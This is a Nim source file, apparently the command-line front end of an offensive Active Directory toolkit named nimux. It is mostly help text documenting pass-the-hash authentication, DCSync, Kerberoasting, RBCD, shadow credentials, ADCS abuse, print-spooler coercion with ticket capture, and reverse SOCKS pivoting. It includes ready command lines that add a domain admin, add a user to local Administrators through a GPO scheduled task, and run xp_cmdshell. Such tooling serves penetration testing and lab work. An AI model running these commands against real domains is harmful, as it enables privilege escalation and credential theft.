import std/[asyncdispatch, asyncnet, base64, json, net, os, osproc, parseopt, random, sequtils, strutils, tables, terminal, times, uri, wordwrap]
import core/[targets, scanner, output, lineread, proxy]
import protocols/smb/client as smbclient
import protocols/ldap/client as ldapclient
import protocols/ldap/dpaping as dpaping
import vendor/winrm as winrmclient
import protocols/mssql/client as mssqlclient
import protocols/rdp/client as rdpclient
import protocols/exec/smbexec as smbexecmod
import protocols/exec/transfer as smbtransfer
import protocols/exec/wmiexec as wmiexecmod
import protocols/exec/psexec as psexecmod
import protocols/exec/socks as socksmod
import protocols/exec/ticketdump as ticketdumpmod
import protocols/exec/spoolcoerce as spoolcoercemod
import protocols/exec/atexec as atexecmod
import protocols/exec/dcomexec as dcomexecmod
import protocols/exec/dcsync as dcsyncmod
import protocols/exec/secrets as secretsmod
import protocols/exec/dpapi as dpapimod
import protocols/kerberos/pkinit as pkinitmod
import protocols/kerberos/asrep as asrepmod
import protocols/kerberos/tgs as tgsmod
import protocols/kerberos/s4u as s4umod
import protocols/ssh/client as sshclient
import protocols/vnc/client as vncclient
import protocols/ftp/client as ftpclient
import protocols/mysql/client as mysqlclient
import protocols/afp/client as afpclient
import protocols/webdav/client as webdavclient
import protocols/postgres/client as pgclient
import protocols/http/client as httpclient
import protocols/nfs/client as nfsclient

const Version = "1.0.2"
const Author = "Chokri Hammedi (blue0x1)"
const FileAttributeReparsePoint = 0x00000400'u32

proc bannerBlue(text: string): string =
  if "--no-color" in commandLineParams():
    text
  else:
    "\e[1;36m" & text & "\e[0m"

proc bannerRed(text: string): string =
  if "--no-color" in commandLineParams():
    text
  else:
    "\e[1;31m" & text & "\e[0m"

proc helpDimGray(text: string): string =
  if "--no-color" in commandLineParams():
    text
  else:
    "\e[38;5;250m" & text & "\e[0m"

type
  RecursiveShareEntry = object
    remotePath: string
    relPath: string
    size: int
    isDirectory: bool
    attributes: uint32

  RecursiveShareWalk = object
    entries: seq[RecursiveShareEntry]
    status: uint32
    message: string

  LocalRecursiveFile = object
    path: string
    relPath: string

  CliConfig = object
    protocol: string
    targets: seq[string]
    port: int
    ports: seq[int]
    concurrency: int
    timeoutMs: int
    retries: int
    sprayDelayMs: int
    maxAttemptsPerUser: int
    lockoutAware: bool
    openOnly: bool
    successOnly: bool
    jsonOutput: bool
    username: string
    password: string
    ntlmHash: string
    usernames: seq[string]
    passwords: seq[string]
    domain: string
    ccachePath: string
    krb5ConfigPath: string
    krb5Realm: string
    krb5TargetRealm: string
    krb5Out: string
    krb5CaPath: string
    krb5Request: string
    krb5Forge: string
    krb5Kirbi: string
    krb5Sid: string
    krb5Rid: uint32
    krb5Groups: string
    krb5ExtraSids: seq[string]
    krb5DurationHours: int
    krb5StartOffsetMinutes: int
    krb5Service: string
    krb5AltService: string
    krb5AesKey: string
    krb5Key: string
    krb5KdcKey: string
    mssqlSpnOverride: string
    remoteCommand: string
    mssqlOleCommand: string
    mssqlClrCommand: string
    mssqlQueryFile: string
    postgresQuery: string
    useSsl: bool
    kerberos: bool
    kerberosDelegate: bool
    localAuth: bool
    shares: bool
    users: bool
    groups: bool
    passwordPolicy: bool
    loggedOnUsers: bool
    sessions: bool
    disks: bool
    ridBrute: bool
    ridBruteStart: uint32
    ridBruteEnd: uint32
    localAdmins: bool
    asreproast: bool
    kerberoast: bool
    computers: bool
    trusts: bool
    gpos: bool
    dcs: bool
    admins: bool
    dns: bool
    ldapSchema: bool
    ldapConfig: bool
    ldapFgpp: bool
    ldapDeleted: bool
    ldapLocked: bool
    ldapExpiredPasswords: bool
    ldapStaleUsers: bool
    ldapNeverLoggedOn: bool
    ldapSites: bool
    ldapSubnets: bool
    ldapUnconstrained: bool
    ldapConstrained: bool
    ldapRbcdTargets: bool
    ldapPasswdNotReqd: bool
    ldapDontExpire: bool
    ldapAdminCount: bool
    ldapCountKind: string
    ldapBase: string
    customLdapFilter: string
    queryLimit: int
    smbDialects: seq[uint16]
    winRmPath: string
    winRmProbeChecked: bool
    msSqlEncryption: int
    rdpProtocols: uint32
    debugProbe: bool
    udpScan: bool
    disableColor: bool
    topPorts: int
    skipPing: bool
    outputFormat: string
    logFile: string
    rollbackOut: string
    dryRun: bool
    shareName: string
    remotePath: string
    localPath: string
    shellMode: bool
    cliMode: bool
    mssqlLinkServer: string
    mssqlXpLinkServer: string
    mssqlOleLinkServer: string
    mssqlClrLinkServer: string
    mssqlLinkChain: seq[string]
    mssqlDatabase: string
    mssqlEnumDanger: bool
    mssqlEnumImpersonate: bool
    mssqlEnableXp: bool
    mssqlEnableOle: bool
    mssqlEnableClr: bool
    recursiveOp: bool
    dcomObject: string
    secretsFull: bool
    secretsOnline: bool
    secretsExecMethod: string
    dcSyncTrustKeys: bool
    addComputer: bool
    computerName: string
    computerPassword: string
    computerOu: string
    computerDnsHost: string
    delegateFrom: string
    delegateTo: string
    ldapAddDn: string
    ldapModifyDn: string
    ldapDeleteDn: string
    ldapDeleteObject: bool
    ldapAttrs: seq[string]
    ldapAddAttrs: seq[string]
    ldapReplaceAttrs: seq[string]
    ldapDeleteAttrs: seq[string]
    ldapLdif: string
    ldapAddDomainAdmin: string
    ldapSetSpnAccount: string
    ldapSetSpnValue: string
    ldapEnableUser: string
    ldapDisableUser: string
    ldapEnableFlag: bool
    ldapDisableFlag: bool
    ldapCreateKind: string
    ldapName: string
    ldapUser: string
    ldapSpn: string
    ldapSetRbcd: bool
    ldapFrom: string
    ldapTo: string
    ldapMakeDadmin: bool
    ldapMakeKerberoast: bool
    ldapMakeAsreproast: bool
    ldapShadowCreds: bool
    ldapCertFile: string
    ldapSchannel: bool
    ldapSetPassword: bool
    ldapNewPass: string
    ldapDeleteKind: string
    ldapLdifOutput: bool
    ldapNestedGroups: bool
    ldapAcl: bool
    ldapAclAdd: bool
    ldapAclRemove: bool
    ldapAclDeny: bool
    ldapAclExact: bool
    ldapAclPrincipal: string
    ldapAclRights: seq[string]
    ldapAclObjectType: string
    ldapAclInheritedObjectType: string
    ldapAclAceFlags: int
    ldapSetOwner: bool
    ldapOwner: string
    ldapGetLaps: bool
    ldapLapsSchema: bool
    ldapCertInventory: bool
    ldapCertMap: bool
    ldapCertMapRemove: bool
    ldapCertMapping: string
    ldapGpo: bool
    ldapGpoCreate: bool
    ldapGpoDelegate: bool
    ldapGpoLink: string
    ldapGpoUnlink: string
    ldapGpoTarget: string
    ldapBadSuccessorTarget: string
    ldapGpoSet: bool
    ldapGpoPut: string
    ldapGpoGet: string
    ldapGpoDelete: string
    ldapGpoLs: bool
    ldapGpoNoBump: bool
    ldapGpoStartup: bool
    ldapGpoSchedTask: bool
    ldapGpoTaskName: string
    ldapGpoTaskCmd: string
    ldapGpoTaskArgs: string
    ldapGpoTaskUser: string
    ldapGpoScriptParams: string
    ldapAdcs: bool
    ldapAdcsRequest: bool
    ldapAdcsAuth: bool
    ldapAdcsCa: string
    ldapAdcsTemplate: string
    ldapAdcsRpc: bool
    ldapAdcsOut: string
    ldapAdcsPfx: string
    ldapAdcsKey: string
    ldapAdcsCcache: string
    ldapAdcsUpn: string
    ldapAdcsDns: string
    ldapAdcsOnBehalfOf: string
    ldapDecryptMsLaps: bool
    ldapMsLapsBlobOut: string
    ldapGetGmsa: bool
    ldapGmsaAccount: string
    ldapDnsAdd: bool
    ldapDnsDelete: bool
    ldapDnsReplace: bool
    ldapDnsZone: string
    ldapDnsRecord: string
    ldapDnsType: string
    ldapDnsData: string
    ldapDnsTtl: int
    ldapAdcsTemplateModify: bool
    ldapSetScriptPath: bool
    ldapScriptPath: string
    ldapAddMember: bool
    ldapRemoveMember: bool
    ldapGroup: string
    ldapShadowOut: string
    ldapRestoreDeleted: bool
    ldapRestoreTo: string
    ldapNewName: string
    ldapMove: bool
    ldapMoveTo: string
    ldapBloodhound: bool
    ldapBloodhoundOut: string
    ldapOpsecNotes: bool
    proxySpec: string
    shellMode2: bool
    ftpLs: bool
    ftpLsPath: string
    smbCoerce: bool
    smbCoerceTarget: string
    coerceListener: string
    smbCaptureTickets: bool
    smbCaptureHost: string
    smbCaptureUser: string
    smbCapturePassword: string
    smbCaptureHash: string
    smbCaptureDomain: string
    smbCaptureOut: string
    smbTicketUser: string
    smbTicketService: string
    smbCaptureSeconds: int
    smbCaptureInterval: int
    smbRawTicket: bool
    smbSetHash: bool
    smbNewHash: string
    ldapPasswdNotReqdAttack: bool
    socksBindAddr: string
    socksAuth: string
    socksPort: int
    socksKill: bool
    socksPid: string
    socksRemotePath: string
    socksTaskName: string
    socksUserProcess: bool
    socksReverse: bool
    socksControlPort: int

proc usageSocks() =
  echo """
nimux socks - Deploy reverse TCP proxy on target via WinRM for pivoting

USAGE
  nimux socks <target> -u <user> {-p <pass>|-H <hash>} [-d <domain>] --reverse --listener <your-ip> [options]
  nimux socks <target> -u <user> {-p <pass>|-H <hash>} [-d <domain>] [options]
  nimux socks <target> -u <user> {-p <pass>|-H <hash>} [-d <domain>] --kill [cleanup options]
  nimux socks <target> -k [-u <user>] [-d <domain>] --reverse --listener <your-ip> [options]

COMMAND FORMS
  deploy reverse       Use --reverse --listener <ip>. Target connects back to
                       the operator, and local 127.0.0.1:<socks-port> becomes
                       the SOCKS5 listener. Recommended for routed/pivoted labs.
  deploy forward       Omit --reverse. The target listens on --bind:<socks-port>.
                       Use only when that target port is reachable from you.
  cleanup              Use --kill with the printed --pid, --socks-task, and/or
                       --remote values from deployment output.

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain
  -k, --kerberos       Use Kerberos for WinRM authentication
  --ccache <file>      Ticket cache to use
  --krb5-config <file> Kerberos config generated with nimux krb5conf

DEPLOYMENT
  --port <n>           WinRM port (default 5985)
  --reverse            Reverse mode: target dials back to --listener (recommended)
  --listener <ip>      Your IP the target connects back to
  --control-port <n>   TCP port for the reverse connection on your machine (default socks-port + 1)
  --socks-port <n>     Local SOCKS5 port on 127.0.0.1 (reverse mode) or target port (forward, default 1080)
  --bind <ip>          Forward mode only: SOCKS listen address on target (default 0.0.0.0)
  --auth <user:pass>   Forward mode only: SOCKS5 username/password auth on the proxy
  --user-process       Start proxy as the WinRM user instead of a scheduled task
  --ssl                Use HTTPS WinRM (port 5986)
  --timeout <ms>       WinRM/deployment timeout
  --remote <path>      Optional remote path for the helper binary

CLEANUP
  --kill               Stop the proxy and remove the binary
  --pid <n>            PID printed at deploy time
  --socks-task <name>  Scheduled task name printed at deploy time
  --remote <path>      Remote binary path printed at deploy time

NOTES
  Reverse mode (--reverse) is strongly recommended. The target connects back to you
  over TCP. All SOCKS connections are multiplexed over one persistent TCP connection.

  After deploy, add to proxychains.conf:
    socks5 127.0.0.1 <socks-port>

  Forward mode (no --reverse) binds SOCKS5 on the target and requires the target's
  port to be reachable from your machine.

EXAMPLES
  nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --reverse --listener 10.10.14.5
  nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --reverse --listener 10.10.14.5 --socks-port 1080 --control-port 1081
  nimux socks dc01.garfield.htb -k --ccache admin.ccache -d garfield.htb --krb5-config krb5.conf --reverse --listener 10.10.14.5
  nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --bind 0.0.0.0 --socks-port 1080 --auth user:pass
  nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --kill --pid 4812 --socks-task nimproxy0abc123 --remote 'C:\Users\...\nimproxyXXXX.exe'
"""

proc usageScan() =
  echo """
nimux scan - TCP/UDP port scanner with service detection

USAGE
  nimux scan <target>... [options]

PROBES
  --port <spec>        Ports to scan. Lists, ranges, or 'all':
                       --port 22,80,8000-8100   --port all
  --top-ports <n>      Scan the top N most common TCP ports (1..1000)
                       from the embedded nmap-services frequency table.
  -F                   Shortcut for --top-ports 100.
  --udp                UDP scan (per-port datagram probes - silent ports
                       report open|filtered, since we can't see ICMP).
  --Pn                 Skip host discovery (treat every target as up).
                       Default behaviour for single-host scans; defaults to
                       on for multi-host (CIDR/range/@file) so down hosts
                       aren't probed for every port.
  --open               Show only open ports in text output.
  --debug-probe        Dump raw probe response bytes (hex+ASCII) per port.

TIMING & CONCURRENCY
  -T<0..5>             Nmap-style timing template:
                         -T0 paranoid  (serial, 5-min timeouts, IDS evasion)
                         -T1 sneaky    (serial, 15s timeouts)
                         -T2 polite    (8 concurrent, 5s timeouts)
                         -T3 normal    (default - 256/1500ms/0 retries)
                         -T4 aggressive(512/1000ms/1 retry - pentest default)
                         -T5 insane    (1024/500ms/0 retries)
  --concurrency <n>    Concurrent sockets (default 256)
  --timeout <ms>       Per-connection timeout (default 1500)
  --retries <n>        Retry on timeout/error before reporting (default 0)
  --spray-delay <ms>   Delay between credential spray batches
  --max-attempts-per-user <n>
                       Cap spray attempts per username in one run
  --lockout-aware      Conservative spray mode: serial, one attempt per user
                       Explicit flags after -T override the template.

OUTPUT
  --json               One JSON object per result on stdout (JSONL).
  -oG                  Nmap-style grepable single-line per host on stdout.
  -oC                  CSV: host,port,transport,state,latency_ms,service,version
  -oX                  nmap-XML flavored output (host > ports > port > state)

PROTOCOL-SPECIFIC SCAN TUNING
  --encrypt <n>        MSSQL prelogin encryption byte (default 0)
  --rdp-proto <n>      RDP requested protocol mask (default 3 = TLS|CredSSP)

TARGETS
  Hostname, IPv4/IPv6 literal (e.g. ::1), CIDR (10.0.0.0/24, 2001:db8::/120),
  IPv4 range (10.0.0.1-10.0.0.50), or @file (newline-separated list).

EXAMPLES
  nimux scan 10.0.0.0/24
  nimux scan dc01 --port 88,135,139,389,445,464,593,3389 --open
  nimux scan dc01 --udp --port 53,88,123,137,161,464
  nimux scan 2001:db8::1 --port 22,80,443 --json
"""

proc usageSmb() =
  echo """
nimux smb - SMB negotiation, authentication, and enumeration

USAGE
  nimux smb <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain (auto-detected from NTLM challenge if omitted)
  --local-auth         Force local-account auth context

ENUMERATION (require -u/-p or -H)
  --shares             Enumerate shares via SRVSVC
  --users              Enumerate domain users via SAMR
  --groups             Enumerate domain groups + local aliases via SAMR
  --pass-pol           Domain password / lockout policy via SAMR
  --loggedon-users     Currently logged-on users via WKSSVC
  --sessions           Active SMB sessions via SRVSVC
  --disks              Server disks via SRVSVC
  --rid-brute [n]    LSARPC RID brute, optional max RID (default 4000)
  --rid-range <a-b>    Explicit RID brute range, e.g. 500-1500
  --coerce --listener <fqdn>
                       Trigger MS-RPRN coercion to the listener
  --coerce-target <s>  Spooler host to coerce when main target is the listener
  --capture-tickets    Deploy native ticket monitor on --capture-host
  --capture-host <s>   Host where tickets are captured, e.g. <listener-host>.FOREST.AD
  --capture-user <s>   Capture-host username (defaults to -u)
  --capture-hash <s>   Capture-host NT hash (defaults to -H)
  --capture-domain <s> Capture-host domain (defaults to -d)
  --capture-out <path> Save first captured ticket as .kirbi and .ccache
  --ticket-user <s>    Ticket user filter, e.g. <machine-account>$
  --capture-seconds <n>Monitor duration in seconds
  --raw-ticket         Stream raw base64 ticket output while capturing

PROTOCOL TUNING
  --port <n>           SMB port (default 445)
  --dialects <list>    SMB dialect IDs in hex, e.g. 0202,0210,0300,0302
  --timeout <ms>       Per-operation timeout (default 1500)

OUTPUT
  --json               Emit one JSON object per target on stdout

EXAMPLES
  nimux smb dc01 -u alice -p 'Pass123!' --shares --users --pass-pol
  nimux smb dc01 -u alice -H aad3b...:31d6c... --rid-brute 5000
  nimux smb <listener-host>.FOREST.AD -u Administrator -H <nthash> -d FOREST.AD \
      --coerce --coerce-target <spooler-host>.CHILD.FOREST.AD \
      --listener <listener-host>.FOREST.AD \
      --capture-tickets --capture-host <listener-host>.FOREST.AD \
      --ticket-user '<machine-account>$' --ticket-service krbtgt \
      --capture-seconds 20 --capture-interval 1 --capture-out captured-ticket
"""

proc usageLdap() =
  echo """
nimux ldap - LDAP/Active Directory query and write engine

USAGE
  nimux ldap <dc> -u <user> {-p <pass>|-H <hash>} -d <domain> [options]

AUTHENTICATION
  -u, --username <s>   Username (sAMAccountName or UPN)
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain (auto-detected from rootDSE if omitted)
  --anonymous          Anonymous bind
  -k, --kerberos       Native LDAP SASL GSSAPI using the local Kerberos cache
  --ccache <file>      Kerberos credential cache file for -k
  --schannel --cert <pem> --key <pem>
                       LDAPS client-certificate auth with SASL EXTERNAL

QUERY
  --query <name>       users, computers, groups, trusts, admins, asreproast, kerberoast, gpos, schema, config, fgpp, deleted, locked, expired-passwords, stale-users, never-logged-on, sites, subnets, dcs, dns, certs, nested-groups, acl, unconstrained, constrained, rbcd-targets, passwd-notreqd, dont-expire, admincount
  --bloodhound         Collect users/groups/computers/trusts/GPOs/DCs/admins as one JSON bundle
  --opsec-notes        Show common Windows event/log artifacts for LDAP/ADCS/GPO actions
  --base <dn>          Search base for --filter custom LDAP queries
  --filter <filter>    Raw LDAP filter, e.g. "(objectClass=user)"
  --attrs <a,b>        Attributes for --filter output
  --limit <n>          Per-query size limit
  --count <name>       Count returned objects for a named query/filter

CREATE
  --create user|computer|group|dmsa --name <name> [--dn <dn>] [--new-pass <pass>]

MODIFY
  --modify --dn <dn> --add <attr=value>
  --modify --dn <dn> --replace <attr=value>
  --modify --dn <dn> --delete <attr=value>
  --modify --dn <dn> --set <attr=value>

ATTACK SHORTCUTS
  --make-dadmin --user <name>
  --make-kerberoast --user <name> --spn <spn>
  --make-asreproast --user <name>
  --set-scriptpath --user <name> --script-path <\\\\host\\share\\script.bat>
  --set-rbcd --from <computer$> --to <computer$>
  --shadow-creds --user <name> --cert <file>
  --shadow-creds --user <name> --shadow-out <prefix>
  --get-laps --computer <name>
  --get-gmsa --name <account> --ldaps
  --laps-schema
  --cert-inventory
  --cert-map --user <account> --mapping <altSecurityIdentities>
  --cert-map --remove-map --user <account> --mapping <altSecurityIdentities>
  --adcs
  --adcs-request --ca <name> --template <name> --out <prefix>
  --adcs-request --ca <name> --template <name> --on-behalf-of <domain\\user>
  --adcs-request --adcs-rpc --ca <name> --template <name> --out <prefix>
  --adcs-request --adcs-rpc --ca <name> --template <name> --on-behalf-of <domain\\user> [--cert <ea.cer> --key <ea.key>]
  --adcs-auth --upn <user@realm> --pfx <file> --ccache <file>
  --adcs-template --template <name> --replace <attr=value>
  --dns-add --zone <zone> --record <name> --type A --data <ipv4> [--ttl <sec>]
  --dns-replace --zone <zone> --record <name> --type A --data <ipv4> [--ttl <sec>]
  --dns-delete --zone <zone> --record <name>
  --add-member --group <group> --user <member>
  --remove-member --group <group> --user <member>
  --acl --add --user <target> --principal <account> --rights <rights>
  --acl --add --dn <domainDN> --principal <account> --rights DCSync
  --acl --add --user <target> --principal <account> --rights ResetPassword|WriteMembers|WriteSPN|RBCD
  --acl --add --deny --user <target> --principal <account> --rights <rights>
  --acl --add --user <target> --principal <account> --rights <rights> --object-type <guid>
  --acl --remove-ace --user <target> --principal <account> --rights <rights>
  --acl --remove-ace --exact --user <target> --principal <account> --rights <rights>
  --set-owner --user <target> --owner <account>
  --gpo --create-gpo --name <displayName>
  --gpo --delegate --name <gpo> --principal <account> [--rights <rights>]
  --gpo --delegate --remove-ace --name <gpo> --principal <account> [--rights <rights>]
  --gpo --link <gpo> --target <dn>
  --gpo --unlink <gpo> --target <dn>
  --gpo --startup --name <gpo> --put <script> [--script-params <args>]
  --gpo --schtask --name <gpo> --task-name <n> --task-cmd <cmd> [--task-args <args>] [--task-user <user>]
  --gpo --set --name <gpo> --replace <attr=value>
  --gpo --put <local> --name <gpo> --remote <path-under-gpo-sysvol>
  --gpo --get <remote> --name <gpo> --local <file>
  --gpo --delete <remote> --name <gpo>
  --gpo --ls --name <gpo> [--remote <dir>]
  --no-bump
  --nested-groups --user <name>
  --acl [--user <name>|--dn <dn>]
  --enable --user <name>
  --disable --user <name>
  --set-password --user <name> --new-pass <pass> --ldaps

DELETE / BATCH
  --delete --dn <dn>
  --delete-user --name <name>
  --delete-computer --name <name$>
  --delete-group --name <name>
  --restore-deleted --name <name> [--restore-to <parentDN>] [--new-name <name>]
  --restore-deleted --dn <deletedDN> --restore-to <parentDN> --new-name <name>
  --ldif <file.ldif>

PROTOCOL TUNING
  --ldaps              Use LDAPS (port 636)
  --gc                 Use Global Catalog (3268, or 3269 with --ldaps)
  --port <n>           Explicit LDAP port
  --proxy <url>        SOCKS5 proxy, e.g. socks5://127.0.0.1:1080
  --timeout <ms>       Per-operation timeout (default 1500)

OUTPUT
  --json               Emit JSON-Lines
  --fields <a,b>       Alias for --attrs
  --no-color           Disable color

EXAMPLES
  nimux ldap dc01 -u admin -p pass -d domain --make-dadmin --user hacker
  nimux ldap dc01 -u admin -p pass -d domain --make-kerberoast --user sql_svc --spn MSSQLSvc/sql01
  nimux ldap dc01 -u admin -p pass -d domain --set-rbcd --from <controlled-computer>$ --to <target-computer>$
  nimux ldap dc01 -u admin -p pass -d domain --modify --dn "CN=user,CN=Users,DC=domain" --add "description=Hacked"

GPO EXAMPLES
  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
      --gpo --create-gpo --name WorkstationLocalAdmin

  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
      --gpo --delegate --name WorkstationLocalAdmin \
      --principal 'CORP\<target-user>' --rights FullControl

  nimux ldap dc01.corp.local -u <gpo-linker> -p '<password>' -d CORP.LOCAL \
      --gpo --link WorkstationLocalAdmin \
      --target 'OU=Workstations,DC=CORP,DC=LOCAL'

  nimux ldap dc01.corp.local -u <gpo-linker> -p '<password>' -d CORP.LOCAL \
      --gpo --link WorkstationLocalAdmin \
      --target 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=CORP,DC=LOCAL'

  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
      --gpo --startup --name WorkstationLocalAdmin \
      --put ./startup.bat --script-params 'arg1 arg2'

  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
      --gpo --schtask --name WorkstationLocalAdmin \
      --task-name NimexecAdmin --task-cmd 'cmd.exe' \
      --task-args '/c net localgroup Administrators CORP\<target-user> /add' \
      --task-user SYSTEM

  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
      --gpo --put ./GptTmpl.inf --name WorkstationLocalAdmin \
      --remote 'Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf'

  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
      --gpo --put ./GPT.INI --name WorkstationLocalAdmin --remote GPT.INI

  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
      --gpo --set --name WorkstationLocalAdmin --replace versionNumber=2 \
      --replace 'gPCMachineExtensionNames=[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]'

  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
      --gpo --ls --name WorkstationLocalAdmin --remote 'Machine'

  nimux ldap dc01.corp.local -u <gpo-linker> -p '<password>' -d CORP.LOCAL \
      --gpo --unlink WorkstationLocalAdmin \
      --target 'OU=Workstations,DC=CORP,DC=LOCAL'
"""

proc usageWinrm() =
  echo """
nimux winrm - WinRM authentication check and remote command execution

USAGE
  nimux winrm <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain
  -k, --kerberos       Use Kerberos auth (default: NTLM)
  --ssl                Use TLS (port 5986 by default)

EXECUTION
  --cmd <command>      Run command and capture stdout/stderr.
  --shell              Open an interactive WinRM shell.

SHELL COMMANDS
  help, /help          Show shell help
  exit, quit           Close the shell
  cd <path>            Change remote directory
  upload <local> [r]   Upload a file
  download <remote> [l]
                       Download a file
  upload-dir <l> [r]   Upload a directory recursively
  download-dir <r> [l] Download a directory recursively
  execute-assembly <local> [args...]
                       Run a managed .NET assembly

PROTOCOL TUNING
  --port <n>           WinRM port (5985 cleartext, 5986 TLS)
  --path <path>        HTTP path (default /wsman)
  --timeout <ms>       Per-operation timeout

OUTPUT
  --json               Emit JSON

EXAMPLES
  nimux winrm dc01 -u admin -p Pass --cmd "whoami /priv"
  nimux winrm dc01 -u admin -H aad3b...:31d6c... --cmd "Get-Process | select -f 5"
  nimux winrm dc01 -u admin -p Pass --ssl
"""

proc usageMssql() =
  echo """
nimux mssql - MSSQL prelogin + Login7 auth + SQLBatch / xp_cmdshell

USAGE
  nimux mssql <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username (SQL login name, or CORP\user for Windows auth)
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair - triggers SSPI/Windows auth
  -d, --domain <s>     Active Directory domain - triggers SSPI/Windows auth
  -k, --kerberos       Use Kerberos SSPI via the local credential cache.
                       Without -k, Windows auth uses NTLMv2 in Login7 SSPI.
  --ccache <file>      Kerberos credential cache file for -k
  --spn <name>         Override Kerberos SPN, e.g. MSSQLSvc/sql01.red.local:1433

EXECUTION
  --query <sql>        Run raw T-SQL, e.g. --query "SELECT @@version"
  --query-file <file>  Run SQL loaded from a local file
  --cmd <command>      Run command via xp_cmdshell (auto-enables on sysadmin)
  --ole <command>      Run command via OLE Automation / WScript.Shell
  --clr <command>      Run command via CLR assembly helper
  --shell              Interactive xp_cmdshell loop
  --cli                Interactive SQL client with helper commands
  --link <server>      Execute via linked server (query/cmd/shell)
  --link-chain <a,b>   Execute through a linked-server chain
  --xp-link <server>   Execute --cmd on a specific linked server
  --ole-link <server>  Execute --ole on a specific linked server
  --clr-link <server>  Execute --clr on a specific linked server
  --enum-danger        Audit dangerous MSSQL capabilities and settings
  --enum-impersonate   Audit impersonation rights / principals
  --enable-xp          Enable xp_cmdshell one-shot
  --enable-ole         Enable OLE one-shot
  --enable-clr         Enable CLR one-shot

SHELL COMMANDS (--shell)
  help, /help          Show shell help
  exit, quit           Close the shell
  cd <path>            Change remote directory
  upload <local> [r]   Upload a file through the command channel
  download <remote> [l]
                       Download a file through the command channel
  upload-dir <l> [r]   Upload a directory recursively
  download-dir <r> [l] Download a directory recursively
  execute-assembly     Not supported over xp_cmdshell

PROTOCOL TUNING
  --port <n>           MSSQL port (default 1433)
  --database <name>    Initial database / one-shot query database (default master)
  --encrypt <n>        Prelogin encryption byte (default 0 = ENCRYPT_OFF)
  --timeout <ms>       Per-operation timeout

OUTPUT
  --json               Emit JSON including result sets

EXAMPLES
  nimux mssql sql01 -u sa -p Pass
  nimux mssql sql01 -u sa -p Pass --query "SELECT name FROM sys.databases"
  nimux mssql sql01 -u sa -p Pass --query-file report.sql
  nimux mssql sql01 -u sa -p Pass --cmd "whoami /priv"
  nimux mssql sql01 -u sa -p Pass --ole "whoami"
  nimux mssql sql01 -u sa -p Pass --clr "whoami"
  nimux mssql sql01 -u sa -p Pass --shell
  nimux mssql sql01 -u sa -p Pass --cli

CLI HELPERS
  help                 Local command list
  whoami               Current login, db user, database
  serverinfo           Server/version/context info
  databases            List databases
  tables [pattern]     List tables in current database
  users                List database principals
  links                List linked servers
  link <server>        Set linked-server context
  unlink               Clear linked-server context
  exec-link <s> <sql>  Run SQL on a linked server
  exec-link-chain <a,b> <sql>  Run SQL or shell command through a link chain
  xp-link <s> <cmd>    Run xp_cmdshell on a specific linked server
  ole-link <s> <cmd>   Run OLE command on a specific linked server
  clr-link <s> <cmd>   Run CLR command on a specific linked server
  xp <cmd>             Run xp_cmdshell
  enable_xp            Enable xp_cmdshell
  impersonate <name>   EXECUTE AS LOGIN = <name>
  revert               REVERT impersonation context
  source <file.sql>    Execute SQL from a local file
"""

proc usageRdp() =
  echo """
nimux rdp - RDP X.224 negotiation + TLS cert + NTLM-info probe

USAGE
  nimux rdp <target>... [options]

PROBE TUNING
  --port <n>           RDP port (default 3389)
  --rdp-proto <n>      Requested protocol mask (default 3 = TLS|CredSSP)
  --timeout <ms>       Per-operation timeout

OUTPUT
  --json               Emit JSON

EXAMPLES
  nimux rdp dc01
  nimux rdp dc01 --json
"""

proc normalizeExecProto(proto: string): string =
  case proto.toLowerAscii()
  of "krb5", "krb5-conf", "krb5config", "krb5-config": "krb5conf"
  of "kerb", "kerberos", "ticket", "tickets": "kerberos"
  of "service", "smbexec": "scm"
  of "wmi", "wmiexec": "cim"
  of "com", "dcom", "dcomexec": "mmc"
  of "psexec", "svc": "bin"
  of "task", "sch", "schtask", "atexec": "tsch"
  of "rm", "del": "rm"
  of "mkdir", "md": "mkdir"
  else: proto.toLowerAscii()

proc usageSmbexec() =
  echo """
nimux scm - Command execution via SVCCTL

USAGE
  nimux scm <target> -u <user> {-p <pass>|-H <hash>} --cmd "<command>"

AUTHENTICATION
  -u, --username <s>   Username (typically Administrator or domain admin)
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain
  -k, --kerberos       Use Kerberos for SMB session setup (requires a valid
                       local ticket cache; SMB signing is supported)
  --local-auth         Force local-account auth context

EXECUTION
  --cmd <command>      Command to execute on target. Output is captured to a
                       file on ADMIN$\Temp\, read back, then deleted.
  --shell              Interactive shell using repeated SCM execution.

SHELL COMMANDS
  help, /help          Show shell help
  exit, quit           Close the shell
  cd <path>            Change remote directory
  upload <local> [r]   Upload a file
  download <remote> [l]
